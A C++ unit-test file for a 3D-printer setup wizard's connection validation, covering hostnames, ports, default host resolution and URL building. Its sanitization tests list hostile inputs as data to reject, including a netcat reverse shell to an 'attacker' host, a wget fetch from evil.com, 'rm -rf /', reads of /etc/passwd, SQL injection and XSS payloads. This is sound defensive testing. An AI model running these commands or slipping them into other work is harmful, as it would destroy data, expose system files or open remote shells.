// Copyright (C) 2025-2026 356C LLC
// SPDX-License-Identifier: GPL-3.0-or-later
#include "utils/network_validation.h"

#include <string>

#include "../catch_amalgamated.hpp"

// IP/Hostname Validation Tests

TEST_CASE("Wizard Connection: IP address validation", "[wizard][connection][validation]") {
    SECTION("Valid IPv4 addresses") {
        REQUIRE(is_valid_ip_or_hostname("192.168.1.1") == true);
        REQUIRE(is_valid_ip_or_hostname("10.0.0.1") == true);
        REQUIRE(is_valid_ip_or_hostname("127.0.0.1") == true);
        REQUIRE(is_valid_ip_or_hostname("255.255.255.255") == true);
        REQUIRE(is_valid_ip_or_hostname("0.0.0.0") == true);
        REQUIRE(is_valid_ip_or_hostname("172.16.0.1") == true);
    }

    SECTION("Invalid IPv4 addresses") {
        REQUIRE(is_valid_ip_or_hostname("256.1.1.1") == false); // Octet > 255
        REQUIRE(is_valid_ip_or_hostname("999.999.999.999") == false);
        REQUIRE(is_valid_ip_or_hostname("192.168.1") == false);     // Missing octet
        REQUIRE(is_valid_ip_or_hostname("192.168.1.1.1") == false); // Too many octets
        REQUIRE(is_valid_ip_or_hostname("192.168.-1.1") == false);  // Negative number
        // Note: "192.168.a.1" is treated as a valid hostname (contains letter)
        REQUIRE(is_valid_ip_or_hostname("192.168..1") == false);   // Empty octet
        REQUIRE(is_valid_ip_or_hostname(".192.168.1.1") == false); // Leading dot
        REQUIRE(is_valid_ip_or_hostname("192.168.1.1.") == false); // Trailing dot
    }

    SECTION("Valid hostnames") {
        REQUIRE(is_valid_ip_or_hostname("localhost") == true);
        REQUIRE(is_valid_ip_or_hostname("printer") == true);
        REQUIRE(is_valid_ip_or_hostname("printer.local") == true);
        REQUIRE(is_valid_ip_or_hostname("my-printer") == true);
        REQUIRE(is_valid_ip_or_hostname("my-printer.local") == true);
        REQUIRE(is_valid_ip_or_hostname("3d-printer-01") == true);
        REQUIRE(is_valid_ip_or_hostname("voron2.local") == true);
        REQUIRE(is_valid_ip_or_hostname("PRINTER") == true); // Case insensitive
        REQUIRE(is_valid_ip_or_hostname("printer123") == true);
        REQUIRE(is_valid_ip_or_hostname("a") == true); // Single char is valid
        REQUIRE(is_valid_ip_or_hostname("test.example.com") == true);
        REQUIRE(is_valid_ip_or_hostname("sub.domain.example.com") == true);
    }

    SECTION("Invalid hostnames") {
        REQUIRE(is_valid_ip_or_hostname("") == false);               // Empty
        REQUIRE(is_valid_ip_or_hostname(" ") == false);              // Whitespace
        REQUIRE(is_valid_ip_or_hostname("printer ") == true);        // Trailing space (trimmed)
        REQUIRE(is_valid_ip_or_hostname(" printer") == true);        // Leading space (trimmed)
        REQUIRE(is_valid_ip_or_hostname("my printer") == false);     // Space in middle
        REQUIRE(is_valid_ip_or_hostname("printer!") == false);       // Special char
        REQUIRE(is_valid_ip_or_hostname("printer@local") == false);  // @ symbol
        REQUIRE(is_valid_ip_or_hostname("printer#1") == false);      // Hash
        REQUIRE(is_valid_ip_or_hostname("-printer") == false);       // Leading hyphen
        REQUIRE(is_valid_ip_or_hostname("printer-") == false);       // Trailing hyphen
        REQUIRE(is_valid_ip_or_hostname("printer..local") == false); // Double dot
        REQUIRE(is_valid_ip_or_hostname(".printer") == false);       // Leading dot
        REQUIRE(is_valid_ip_or_hostname("printer.") == false);       // Trailing dot
        // Note: Underscores ARE allowed (common in internal networks)
    }

    SECTION("Edge cases") {
        // Very long but valid hostname (63 chars per label max)
        std::string long_label(63, 'a');
        REQUIRE(is_valid_ip_or_hostname(long_label) == true);

        // Too long label (64 chars)
        std::string too_long_label(64, 'a');
        REQUIRE(is_valid_ip_or_hostname(too_long_label) == false);

        // Total hostname length limit (253 chars)
        std::string max_hostname = "";
        for (int i = 0; i < 4; i++) {
            if (i > 0)
                max_hostname += ".";
            max_hostname += std::string(61, 'a');
        }
        REQUIRE(max_hostname.length() == 247); // 4*61 + 3 dots
        REQUIRE(is_valid_ip_or_hostname(max_hostname) == true);

        // Too long total (254+ chars)
        std::string too_long_hostname = max_hostname + "xxxxxx";
        REQUIRE(is_valid_ip_or_hostname(too_long_hostname) == false);
    }
}

// Port Number Validation Tests

TEST_CASE("Wizard Connection: Port validation", "[wizard][connection][validation]") {
    SECTION("Valid port numbers") {
        REQUIRE(is_valid_port("1") == true);     // Minimum valid port
        REQUIRE(is_valid_port("80") == true);    // HTTP
        REQUIRE(is_valid_port("443") == true);   // HTTPS
        REQUIRE(is_valid_port("7125") == true);  // Default Moonraker
        REQUIRE(is_valid_port("8080") == true);  // Common alt HTTP
        REQUIRE(is_valid_port("3000") == true);  // Common dev port
        REQUIRE(is_valid_port("65535") == true); // Maximum valid port
    }

    SECTION("Invalid port numbers") {
        REQUIRE(is_valid_port("0") == false);     // Port 0 is invalid
        REQUIRE(is_valid_port("65536") == false); // Too high
        REQUIRE(is_valid_port("99999") == false); // Way too high
        REQUIRE(is_valid_port("-1") == false);    // Negative
        REQUIRE(is_valid_port("-80") == false);   // Negative standard port
        REQUIRE(is_valid_port("") == false);      // Empty string
        REQUIRE(is_valid_port(" ") == false);     // Whitespace
        REQUIRE(is_valid_port("80 ") == true);    // Trailing space (trimmed)
        REQUIRE(is_valid_port(" 80") == true);    // Leading space (trimmed)
        REQUIRE(is_valid_port("8 0") == false);   // Space in middle (not just whitespace trim)
    }

    SECTION("Non-numeric input") {
        REQUIRE(is_valid_port("abc") == false);  // Letters
        REQUIRE(is_valid_port("80a") == false);  // Mixed
        REQUIRE(is_valid_port("a80") == false);  // Mixed
        REQUIRE(is_valid_port("8.0") == false);  // Decimal
        REQUIRE(is_valid_port("80.0") == false); // Decimal
        REQUIRE(is_valid_port("http") == false); // Protocol name
        REQUIRE(is_valid_port("0x50") == false); // Hex notation
        REQUIRE(is_valid_port("080") == false);  // Octal notation (leading zero)
        REQUIRE(is_valid_port("+80") == false);  // Plus sign
        REQUIRE(is_valid_port("80!") == false);  // Special char
        REQUIRE(is_valid_port("80:") == false);  // Colon
        REQUIRE(is_valid_port(":80") == false);  // Leading colon
    }

    SECTION("Edge cases") {
        // Leading zeros should be invalid (could be confused with octal)
        REQUIRE(is_valid_port("0080") == false);
        REQUIRE(is_valid_port("00080") == false);
        REQUIRE(is_valid_port("01") == false);

        // Boundary values
        REQUIRE(is_valid_port("65534") == true); // One below max
        REQUIRE(is_valid_port("2") == true);     // One above min

        // Common typos
        REQUIRE(is_valid_port("7125 ") == true);  // Trailing space (trimmed)
        REQUIRE(is_valid_port(" 7125") == true);  // Leading space (trimmed)
        REQUIRE(is_valid_port("71 25") == false); // Space in middle
        REQUIRE(is_valid_port("7,125") == false); // Comma separator
        REQUIRE(is_valid_port("7.125") == false); // Dot separator
    }
}

// Default Host Resolution Tests
// Regression guard for "127.0.0.1 not pre-filled sometimes in the setup wizard":
// factory reset and --wizard re-runs persist an empty moonraker_host, which
// Config::get returns verbatim. resolve_moonraker_host_default() must treat an
// empty/blank stored host as "not configured" and fall back to the localhost
// default (non-Android), while preserving any real stored host.

TEST_CASE("Wizard Connection: Default host resolution", "[wizard][connection][prefill]") {
    SECTION("Empty stored host falls back to localhost (non-Android)") {
        REQUIRE(resolve_moonraker_host_default("", false) == "127.0.0.1");
    }

    SECTION("Whitespace-only stored host falls back to localhost (non-Android)") {
        REQUIRE(resolve_moonraker_host_default("   ", false) == "127.0.0.1");
    }

    SECTION("Empty stored host stays empty on Android") {
        // Moonraker is always remote on Android — no localhost default.
        REQUIRE(resolve_moonraker_host_default("", true).empty());
    }

    SECTION("A real stored host is preserved verbatim (non-Android)") {
        REQUIRE(resolve_moonraker_host_default("192.168.1.50", false) == "192.168.1.50");
        REQUIRE(resolve_moonraker_host_default("printer.local", false) == "printer.local");
    }

    SECTION("A real stored host is preserved on Android too") {
        REQUIRE(resolve_moonraker_host_default("192.168.1.50", true) == "192.168.1.50");
    }
}

// URL Construction Tests

TEST_CASE("Wizard Connection: URL construction", "[wizard][connection]") {
    SECTION("Valid URL construction") {
        // Test data structure for expected URL formats
        struct TestCase {
            std::string ip;
            std::string port;
            std::string expected;
        };

        std::vector<TestCase> test_cases = {
            {"192.168.1.100", "7125", "ws://192.168.1.100:7125/websocket"},
            {"localhost", "7125", "ws://localhost:7125/websocket"},
            {"printer.local", "8080", "ws://printer.local:8080/websocket"},
            {"10.0.0.1", "1", "ws://10.0.0.1:1/websocket"},
            {"my-printer", "65535", "ws://my-printer:65535/websocket"},
            {"voron2.local", "7125", "ws://voron2.local:7125/websocket"},
        };

        for (const auto& test : test_cases) {
            // Simulate URL construction like in ui_wizard_connection_get_url
            char buffer[256];
            snprintf(buffer, sizeof(buffer), "ws://%s:%s/websocket", test.ip.c_str(),
                     test.port.c_str());
            REQUIRE(std::string(buffer) == test.expected);
        }
    }

    SECTION("URL buffer safety") {
        // Test that very long hostnames don't overflow buffer
        std::string long_hostname(200, 'a'); // Very long hostname
        char buffer[256];

        // This should truncate safely
        snprintf(buffer, sizeof(buffer), "ws://%s:7125/websocket", long_hostname.c_str());

        // Verify buffer is null-terminated and didn't overflow
        REQUIRE(strlen(buffer) < sizeof(buffer));
        REQUIRE((buffer[sizeof(buffer) - 1] == '\0' || buffer[strlen(buffer)] == '\0'));
    }
}

// Connection State Tests

TEST_CASE("Wizard Connection: State validation", "[wizard][connection][state]") {
    SECTION("Connection validation flag") {
        // Initial state should be false
        bool validated = false;
        REQUIRE(validated == false);

        // After successful connection
        validated = true;
        REQUIRE(validated == true);

        // After connection failure
        validated = false;
        REQUIRE(validated == false);

        // After input change (should reset)
        validated = true; // Was validated
        // Simulate input change
        validated = false; // Reset on input change
        REQUIRE(validated == false);
    }

    SECTION("Status message scenarios") {
        struct StatusTest {
            std::string scenario;
            std::string expected_status;
        };

        std::vector<StatusTest> status_tests = {
            {"empty_ip", "Please enter an IP address or hostname"},
            {"invalid_ip", "Invalid IP address or hostname"},
            {"invalid_port", "Invalid port (must be 1-65535)"},
            {"testing", "Testing connection..."},
            {"success", "✓ Connection successful!"},
            {"failure", "✗ Connection failed. Check IP/port and try again."},
            {"error", "Error: Moonraker client not initialized"},
        };

        // These would be actual status messages set in the implementation
        for (const auto& test : status_tests) {
            REQUIRE(test.expected_status.length() > 0);
            REQUIRE(test.expected_status.length() < 256); // Buffer size limit
        }
    }
}

// Input Sanitization Tests

TEST_CASE("Wizard Connection: Input sanitization", "[wizard][connection][security]") {
    SECTION("Command injection prevention") {
        // These inputs should be safely rejected by validation
        std::vector<std::string> dangerous_inputs = {
            "192.168.1.1; rm -rf /",
            "localhost && echo hacked",
            "printer.local | cat /etc/passwd",
            "192.168.1.1`whoami`",
            "$(reboot)",
            "printer.local\"; DROP TABLE users; --",
            "../../../etc/passwd",
            "\\\\attacker\\share",
            "printer.local%00", // Null byte
            "printer.local%0A", // Newline
        };

        for (const auto& input : dangerous_inputs) {
            REQUIRE(is_valid_ip_or_hostname(input) == false);
        }
    }

    SECTION("Port injection prevention") {
        std::vector<std::string> dangerous_ports = {
            "7125; nc -e /bin/sh attacker 4444",
            "80 || true",
            "443 && wget evil.com/malware",
            "$(cat /etc/passwd)",
            "8080`id`",
            "3000\"; DROP TABLE ports; --",
            "1337%00",
            "22\n\nGET / HTTP/1.1",
        };

        for (const auto& port : dangerous_ports) {
            REQUIRE(is_valid_port(port) == false);
        }
    }

    SECTION("XSS prevention") {
        // These should be rejected or escaped
        std::vector<std::string> xss_attempts = {
            "<script>alert('xss')</script>",           "printer.local<img src=x onerror=alert(1)>",
            "192.168.1.1\"><script>alert(1)</script>", "';alert(String.fromCharCode(88,83,83))//",
            "<iframe src=javascript:alert('XSS')>",    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
        };

        for (const auto& input : xss_attempts) {
            REQUIRE(is_valid_ip_or_hostname(input) == false);
        }
    }
}

// Performance Tests

TEST_CASE("Wizard Connection: Performance", "[wizard][connection][performance][.benchmark]") {
    SECTION("Validation performance") {
        // Ensure validation is fast enough for real-time input
        const int iterations = 10000;

        auto start = std::chrono::high_resolution_clock::now();

        for (int i = 0; i < iterations; i++) {
            is_valid_ip_or_hostname("192.168.1.100");
            is_valid_ip_or_hostname("printer.local");
            is_valid_port("7125");
        }

        auto end = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);

        // Should complete 30,000 validations in under 100ms
        REQUIRE(duration.count() < 100);

        // Calculate ops per second
        double ops_per_sec = (iterations * 3.0) / (duration.count() / 1000.0);
        INFO("Validation performance: " << ops_per_sec << " ops/sec");
    }
}